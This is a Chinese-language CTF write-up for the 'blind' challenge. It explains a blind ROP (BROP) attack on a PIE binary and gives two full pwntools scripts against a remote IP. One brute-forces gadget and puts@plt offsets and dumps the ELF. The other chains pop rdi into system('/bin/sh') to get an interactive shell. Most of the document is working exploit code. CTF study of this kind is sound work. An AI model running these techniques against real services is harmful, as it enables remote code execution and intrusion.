---
data: 2024-10-13 19:55
challenge: blind
tags:
  - BROP with PIE
---

> BROP 感觉就是纯纯的体力活，没什么意思。

## Analysis

题目没有附件，可以在栈上进行大范围的泄漏和改写，采用基本 BROP 的思路即可，期间要加上一些错误处理，即：

- 先爆破 `stop_gadget`，这里正好找到了一个 `puts(”Error.”)` 的函数；
- 找 `_libc_csu_init` 的偏移，找到 `brop_gadget` ；
- 于是就有了 `pop_rdi_ret` 等常用 gadgets，可以先爆破 `puts@plt` ，这通常在代码段前部并且对齐到 8，因此还是比较好爆破的；
- 最后并不需要 dump 整个 elf，根据 `puts@plt` 去找 got 表即可找到对应的 libc；

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from pwn import *

# context.log_level = "debug"

io = remote("120.46.65.156", 32104)

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
# lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

def cmd(insn, in_bin=False):
    if not in_bin:
        insn = insn.encode()
    ru(b"> ")
    sl(insn)

def change_8(now, target):
    now_list = p64(now)
    target_list = p64(target)
    for i in range(8):
        if now_list[i] < target_list[i]:
            temp = target_list[i] - now_list[i]
            cmd(i2b(temp) + b"wd", True)
        elif now_list[i] > target_list[i]:
            temp = now_list[i] - target_list[i]
            cmd(i2b(temp) + b"sd", in_bin=True)
        else:
            cmd("d")

def leak_up(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak

def leak_down(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak

stop_gadget = 0x215
brop_gadget = 0x5D2
puts_plt = 0x60
pop_rsi_r15_ret = brop_gadget + 7
pop_rdi_ret = brop_gadget + 9
ret_addr = brop_gadget + 10

def burp_stop():
    global io, stop_gadget
    burp_offset = 0x131 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + burp_offset)
            cmd("48a")

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            assert b"timeout" not in result
            assert b"free(): invalid pointer" not in result
            print(result)
            io.close()
            lg("Success off", burp_offset)
            stop_gadget = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()

def burp_brop_gadget():
    global io, stop_gadget, brop_gadget
    burp_offset = 0x26 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + burp_offset)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, 0xDEADBEEF)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, 0xDEADBEEF)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, 0xDEADBEEF)
            cmd("72a")
            leak = leak_up(10)
            cmd("72d")
            change_8(leak, 0xDEADBEEF)
            cmd("80a")
            leak = leak_up(11)
            cmd("80d")
            change_8(leak, 0xDEADBEEF)
            cmd("88a")
            leak = leak_up(12)
            cmd("88d")
            change_8(leak, 0xDEADBEEF)
            cmd("96a")
            leak = leak_up(13)
            cmd("96d")
            change_8(leak, elf_base + stop_gadget)
            cmd("104a")

            leak_up(6)
            leak_up(7)
            leak_up(8)
            leak_up(9)
            leak_up(10)
            if leak_up(11) != 0xDEADBEEF:
                no_increase_flag = True
                raise Error
            leak_up(12)
            leak_up(13)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            print(result)
            assert b"timeout" not in result
            assert b"Error." in result
            io.close()
            lg("Success off", burp_offset)
            stop_gadget = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()

def burp_puts_plt():
    global io, stop_gadget, brop_gadget, puts_plt
    burp_offset = 0x07 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + pop_rdi_ret)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, elf_base)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, elf_base + burp_offset)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, elf_base + stop_gadget)
            cmd("72a")

            if leak_up(6) != elf_base + pop_rdi_ret:
                no_increase_flag = True
                raise Error
            leak_up(7)
            leak_up(8)
            leak_up(9)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            print(result)
            assert b"timeout" not in result
            assert b"ELF" in result
            io.close()
            lg("Success off", burp_offset)
            puts_plt = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()

def dump_elf():
    global io, stop_gadget, brop_gadget, puts_plt
    burp_offset = 0x00
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + pop_rdi_ret)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, elf_base + puts_plt + burp_offset)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, elf_base + puts_plt)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, elf_base + stop_gadget)
            cmd("72a")

            if leak_up(6) != elf_base + pop_rdi_ret:
                no_increase_flag = True
                raise Error
            leak_up(7)
            leak_up(8)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            result = result[: result.index(b"\nError.\n")]

            if result == b"":
                result = b"\x00"
            print(result)

            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += len(result)

            with open("./dump2.bin", "ab") as fd:
                fd.write(result)
            io.close()

        except Exception as e:
            print(e)
            io.close()

if __name__ == "__main__":
    # io.close()
    if not stop_gadget:
        burp_stop()
    if not brop_gadget:
        burp_brop_gadget()
    if not puts_plt:
        burp_puts_plt()
    dump_elf()
```

上面的脚本爆破完便宜后按常规 ROP 来打就行：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
# elf: ELF = gift.elf
# libc: ELF = gift.libc

def convert(one_byte):
    temp_val = ord(one_byte)
    if temp_val >= 0 and temp_val < 0x20:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x20 and temp_val < 0x40:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x40 and temp_val < 0x60:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x60 and temp_val < 0x80:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x80 and temp_val < 0xA0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xA0 and temp_val < 0xC0:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0xC0 and temp_val < 0xE0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xE0 and temp_val < 0x100:
        return bytes([(temp_val - 0x20)])

def cmd(insn, in_bin=False):
    if not in_bin:
        insn = insn.encode()
    ru(b"> ")
    sl(insn)

def change_8(now, target):
    now_list = p64_ex(now)
    target_list = p64_ex(target)
    for i in range(8):
        if now_list[i] < target_list[i]:
            temp = target_list[i] - now_list[i]
            cmd(i2b(temp) + b"wd", True)
        elif now_list[i] > target_list[i]:
            temp = now_list[i] - target_list[i]
            cmd(i2b(temp) + b"sd", in_bin=True)
        else:
            cmd("d")

def leak_up(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    leak = u64_ex(ru(b"\n", drop=True)[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak

def leak_down(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    leak = u64_ex(ru(b"\n", drop=True)[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak

def dump_stack(leak_times):
    stack_dump = []
    for i in range(leak_times):
        temp = leak_up(i)
        stack_dump.append(temp)

    for i in range(len(stack_dump)):
        # lg("stack", stack_dump[len(stack_dump) - 1 - i])
        lg("stack", stack_dump[i])

ru(b"A]aaaaaa")
cmd(" ")
cmd("8d")

# dump_stack(20)

elf_leak = leak_down(1)
elf_base = elf_leak - 0x540
stop_gadget = elf_base + 0x215
brop_gadget = elf_base + 0x5D2
pop_rsi_r15_ret = brop_gadget + 7
pop_rdi_ret = brop_gadget + 9
ret_addr = brop_gadget + 10
puts_plt = elf_base + 0x60
puts_got = elf_base + 0x3030

# try_ret = elf_base + 0x130 + 4
# ret_gadget = elf_base + 0x131
main_addr = elf_base + 0xE0

try_offsets = [
    0x72230,  # 0x6C230,  # 0x7F230,  # puts
    0x45E50,  # 0x42310,  # 0x4FC20,  # system
    0x195152,  # 0x187583,  # 0x1BAFCA,  # binsh
]

elf_leak2 = leak_up(6)
cmd("40d")
change_8(elf_leak2, pop_rdi_ret)
cmd("48a")

leak = leak_up(7)
libc_addr = leak + 0x4EA61 - try_offsets[0]
cmd("48d")
change_8(leak, libc_addr + try_offsets[2])
cmd("56a")

leak = leak_up(8)
cmd("56d")
change_8(leak, libc_addr + try_offsets[1])
cmd("64a")

leak = leak_up(9)
cmd("64d")
change_8(leak, stop_gadget)
cmd("72a")

leak_up(6)
leak_up(7)
leak_up(8)

cmd("8a16a24w")
# sl()
# ru(b"!\n")
# puts_addr = u64_ex(ru(b"\n", drop=True))
# lg("puts_addr", puts_addr)
lg("libc_addr", libc_addr)

ia()
```
